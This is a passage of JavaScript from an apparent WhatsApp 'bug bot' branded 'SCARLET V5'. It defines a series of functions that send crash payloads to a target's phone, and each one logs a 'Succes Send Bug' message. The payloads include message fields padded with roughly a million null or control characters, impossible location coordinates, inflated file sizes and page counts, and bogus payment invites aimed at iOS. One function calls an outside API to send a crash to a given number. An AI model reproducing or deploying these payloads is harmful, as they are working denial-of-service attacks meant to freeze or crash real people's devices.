							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍👑🤴 𝐊𝐈𝐍𝐆 𝐁𝐀𝐃𝐁𝐎𝐈𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

		const Porke2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./thumb.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍👑𝐘 𝐊𝐈𝐍𝐆 𝐁𝐀𝐃𝐁𝐎𝐈𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}
		
		async function sendCrash(X) {
			try {
				const newcrash = await
fetchJson('https://venomweb.site/i/sendCrashlphone?numero=' + target + '&total=1&apikey=xeonkey' );
				console.log(chalk.red("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 Succes Send Bug By ©King badboi 👑"));
				console.log(chalk.red("InVisible⚡"));
			} catch (error) {
				console.error("Error Fetching Crash:", error);
			}
		}
		// HAX \\
		const Qrad = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐈𝐬 𝐇𝐞𝐫𝐞 👑\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RizxzNewtech\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}


		const VisiX = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐈𝐬 𝐇𝐞𝐫𝐞 👑\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RizxzNewtech\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		const VisiXLoc = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐈𝐬 𝐇𝐞𝐫𝐞 👑\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RizxzNewtech\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(777777)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		// ZNX INVASIONS \\

		async function InVisiLocNull(X, Qtd, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "⭑̤⟅̊༑ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏" + "ꦾ".repeat(77777),
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5ㄈ尺Λらн👑️",
										"address": "👺༑⌁⃰𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐂𝐫𝐚𝐬𝐡 👑👑️",
										"jpegThumbnail": ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
									messageParamsJson: " 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5ㄈ尺Λらн 𝐁𝐔𝐆 𝐕𝟐👑️ ",
									buttons: [{
											name: "single_select",
											buttonParamsJson: {
												"title": "👺༑⌁⃰𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐂𝐫𝐚𝐬𝐡 👑👑️",
												"sections": [{
													"title": "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐈𝐬 𝐇𝐞𝐫𝐞 👑",
													"rows": []
												}]
											}
										},
										{
											name: "call_permission_request",
											buttonParamsJson: {}
										}
									],
								},
							}
						}
					}
				}), {
					userJid: X,
					quoted: Qtd
				}
			);
			await bad.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 Succes Send Bug By ©King badboi 👑"));
		};

		async function InVisiLocXz(X, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "⭑̤⟅̊༑ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5ㄈ尺Λらн👑️",
										"address": "👺༑⌁⃰𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐂𝐫𝐚𝐬𝐡 👑👑️",
										"jpegThumbnail": ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
									messageParamsJson: " 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5ㄈ尺Λらн 𝐁𝐔𝐆 𝐕𝟐👑️ ",
									buttons: [{
											name: "single_select",
											buttonParamsJson: {
												"title": "👺༑⌁⃰𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐂𝐫𝐚𝐬𝐡 👑👑️",
												"sections": [{
													"title": "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐈𝐬 𝐇𝐞𝐫𝐞 👑",
													"rows": []
												}]
											}
										},
										{
											name: "call_permission_request",
											buttonParamsJson: {}
										}
									],
								},
							}
						}
					}
				}), {
					userJid: X,
					quoted: VisiXLoc
				}
			);
			await bad.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 Succes Send Bug By ©King badboi 👑"));
		};
								
		async function ClPm(X, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐂𝐫𝐚𝐬𝐡 👑🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5ㄈ尺Λらн👑️"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐂𝐫𝐚𝐬𝐡 👑👑️" + "᬴".repeat(0) + "\",\"sections\":[{\"title𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞👑ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐂𝐫𝐚𝐬𝐡 👑👑️\",\"sections\":[{\"title𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞👑ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"👑️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: EsQl
				}
			);

			await bad.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 Succes Send Bug By ©King badboi 👑"));
		};

		async function ClPmNull(X, Qtd, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐂𝐫𝐚𝐬𝐡 👑🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "⭑̤⟅̊༑ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + "ꦾ".repeat(77777)
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐂𝐫𝐚𝐬𝐡 👑👑️" + "᬴".repeat(0) + "\",\"sections\":[{\"title𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞👑ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐂𝐫𝐚𝐬𝐡 👑👑️\",\"sections\":[{\"title𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞👑ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"👑️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: Qtd
				}
			);

			await bad.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 Succes Send Bug By ©King badboi 👑"));
		};

		async function ZnX(X, Txt, Amount, Ptcp = true) {
			await bad.relayMessage(X, {
					viewOnceMessage: {
						message: {
							interactiveResponseMessage: {
								body: {
									text: Txt,
									format: "EXTENSIONS_1"
								},
								nativeFlowResponseMessage: {
									name: 'galaxy_message',
									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(Amount)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
									version: 3
								}
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.red("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 Succes Send Bug By ©King badboi 👑"));
		};

		async function CrL(X, Qtd, Txt, Ptcp = true) {
			let etc = generateWAMessageFromContent(X, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: Txt
							},
							nativeFlowMessage: {
								messageParamsJson: " znx guarantees all phones :) \n\n\n I know, you tried to copy this bug with m.quoted/m.message, right ? "
							},
							carouselMessage: {}
						}
					}
				}
			}), {
				userJid: X,
				quoted: Qtd
			});

			await bad.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 Succes Send Bug By ©King badboi 👑"));
		};

		async function ZnXIvS(X, Ptcp = true) {
			let etc = generateWAMessageFromContent(X, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: "⭑̤⟅̊༑ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤"
							},
							nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: " 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5ㄈ尺Λらн👑️ "
							},
							carouselMessage: {}
						}
					}
				}
			}), {
				userJid: X,
				quoted: Qrad
			});

			await bad.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 Succes Send Bug By ©King badboi 👑"));
		};

		async function OutOff(X, Ptcp = true) {
			let etc = generateWAMessageFromContent(X, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "⭑̤⟅̊༑ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ▾ ༑̴⟆̊⿻‏‎‏‎‏‎‏‏‎‏‎‏‎‏",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: ""
							},
							nativeFlowMessage: {
								messageParamsJson: " ZnX Company Tagline Here!! \n\n\n You Stupid?? ",
								buttons: [{
									name: "payment_info",
									buttonParamsJson: `{\"currency\":\"IRP\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"XXX\",\"key\":\"+99999999999\",\"key_type\":\"XXX\"}}]}`
								}],
							},
						}
					}
				}
			}), {
				userJid: X
			});
			await bad.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
		}
		
		async function Tedex(X, QTD) {
			await bad.relayMessage(X, {
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								'title': '',
								'locationMessage': {},
								'hasMediaAttachment': true
							},
							'body': {
								'text': '𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5ㄈ尺Λらн👑️' + '\x00'.repeat(950000)
							},
							'nativeFlowMessage': {
								'messageParamsJson': '\x00'
							},
							'carouselMessage': {}
						}
					}
				}
			}, {
				participant: {
					jid: X
				}
			});
			await bad.sendMessage(X, {
				text: `𝙆𝙄𝙉𝙂 𝘽𝘼𝘿𝘽𝙊𝙄  𝐂𝐑𝐀𝐒𝐇\`👑`
			}, {
				quoted: QTD
			});
			console.log(chalk.red("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 Succes Send Bug By ©King badboi 👑"));
		};

		async function IosCrash(LockJids) {
			await bad.relayMessage(LockJids, {
				"paymentInviteMessage": {
					serviceType: "FBPAY",
					expiryTimestamp: Date.now() + 1814400000
				}
			}, {
				participant: {
					jid: LockJids
				}
			})
			console.log(chalk.red("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 Succes Send Bug By ©King badboi 👑"));
		};

		
		async function XiosPay(jid) {
			bad.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
			console.log(chalk.red("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 Succes Send Bug By ©King badboi 👑"));
		};

		async function StuckNull(X, ThM, Ptcp = true) {
			await bad.relayMessage(X, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "⭑̤⟅̊༑ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: ThM,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "⭑̤⟅̊༑ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '👺༑⌁⃰𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐂𝐫𝐚𝐬𝐡 👑👑️', url: \"https://youtube.com/Akmalscar1\", merchant_url: \"https://youtube.com/Akmalscar1\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["62895364760801@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5ㄈ尺Λらн 𝐁𝐔𝐆 𝐕𝟐👑️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.red("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 Succes Send Bug By ©King badboi 👑"));
		};

		async function StuckSql(X, ThM, Ptcp = true) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
